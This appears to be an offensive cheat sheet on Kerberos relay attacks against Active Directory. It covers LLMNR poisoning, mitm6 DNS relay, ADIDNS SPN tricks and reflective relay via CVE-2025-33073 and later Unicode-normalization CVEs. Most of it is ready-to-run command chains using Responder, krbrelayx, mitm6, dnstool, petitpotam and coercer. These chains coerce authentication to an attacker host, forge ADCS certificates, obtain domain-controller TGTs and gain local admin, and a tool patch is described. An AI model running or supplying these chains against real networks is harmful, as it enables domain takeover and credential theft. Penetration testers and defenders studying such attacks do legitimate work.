# KERBEROS RELAY

Relays a client's Kerberos AP-REQ (service ticket) to a different service, when neither client nor target enforces signing. The SPN's service class is usually not checked, so a ticket issued for one service class on an account can be reused against other services running under that same account. Tools: `krbrelayx` (Python), `KrbRelayEx` (C#).

### Over HTTP — LLMNR poisoning

Spoof the LLMNR answer name so a failed name lookup (typo, misconfig, or a forced WebDAV coercion to a nonexistent record) resolves to the attacker, who then relays the resulting AP-REQ.

```
python3 Responder.py -I $INTERFACE -N $RELAY_TARGET_NETBIOSNAME
python3 krbrelayx.py --target 'http://$ADCS_FQDN/certsrv/' -ip $ATTACKER_IP --adcs --template User
```

ESC8 example:

```
python3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>
sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
```

### Over DNS — mitm6 + Secure Dynamic Updates

mitm6 intercepts the client's DNS SOA query and poses as the authoritative DNS server, capturing the Kerberos auth sent during the TKEY exchange and relaying it on (good targets: AD CS / SCCM over HTTP(S), or any HOST-mapped service).

```
# Terminal 1 — waiting for the relay
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP --victim $TARGET_SAMNAME --adcs --template Machine

# Terminal 2 — poison the victim
mitm6 -i $ATTACKER_IP -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
```

Alternate ESC8 chain, using the resulting cert to request a TGT:

```
sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
```

### Over SMB — ADIDNS SPN trick

Abuses how SMB clients build SPNs (`CredMarshalTargetInfo`): register an ADIDNS record that still satisfies the SPN but resolves to the attacker. Tools: `cube0x0/KrbRelay`, `decoder-it/KrbRelayEx-RPC`.

```
dnstool.py -u "$DOMAIN\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp

krbrelayx.py -t "http://$CA/certsrv/certfnsh.asp" --adcs --template DomainController -v "$RELAYED_TARGET_SAMNAME"

coercer coerce -t $TARGET_IP -l "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
```

If the relay target is unsigned SMB and the captured auth is privileged, dump straight away: `krbrelayx.py -t smb://$TARGET_FQDN`.

Alternate chain, landing a DC machine cert and converting it to a TGT:

```
dnstool.py -u "DOMAIN.LOCAL\user" -p "pass" -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
petitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc.domain.local
krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
```

### Reflection — CVE-2025-33073

Same marshalled-target-info DNS trick as the NTLM version (a `1UWhRCAA...`-suffixed record), kept in Kerberos and self-relayed — grants local admin.

```
dnstool.py -u 'domain.local\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 198.51.100.27
# OR
pretender -i "vmnet2" --spoof "target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" --no-dhcp --no-timestamps
```

Requires patching `krbrelayx/lib/servers/smbrelayserver.py` — remove the lines (around 156–159) that force the blob's mech type back to NTLM, so Kerberos passes through unmodified.

```
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
krbrelayx.py --target smb://target.lab.redteam -c whoami
```

Trigger the callback:

```
nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# OR
petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
# OR
wspcoerce 'lab.redteam/user:password@target.lab.redteam' file:////target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
```

### Reflective relay via Unicode normalization — CVE-2025-58726 / CVE-2026-26128

Extends the reflective chain with lookalike Unicode characters (e.g. Ⓡ U+24C7, ․ U+2024) that the DC's LDAP search normalizes as matching the real SPN, while `DnsCache` fails to recognize as localhost — so the lookalike FQDN both passes SPN validation and resolves to the attacker.

```
dnstool.py -u "$DOMAIN\$USER" -p "$PASSWORD" "$DC_IP" --action add -r "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" -d "$ATTACKER_IP"

krbrelayx.py -t smb://"$TARGET_FQDN"

petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" "$TARGET_FQDN"
```

Cleanup: `dnstool.py -u "$DOMAIN\$USER" -p "$PASSWORD" "$DC_IP" --action remove -r "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" --tcp`.

Even after the March 2026 patch (enforces SMB signing on loopback), HTTP targets without channel binding stay exploitable — ADCS Web Enrollment, SCCM AdminService, MSSQL. The modified `krbrelayx.py` needed for this wasn't public as of June 2026; watch the krbrelayx repo for a release.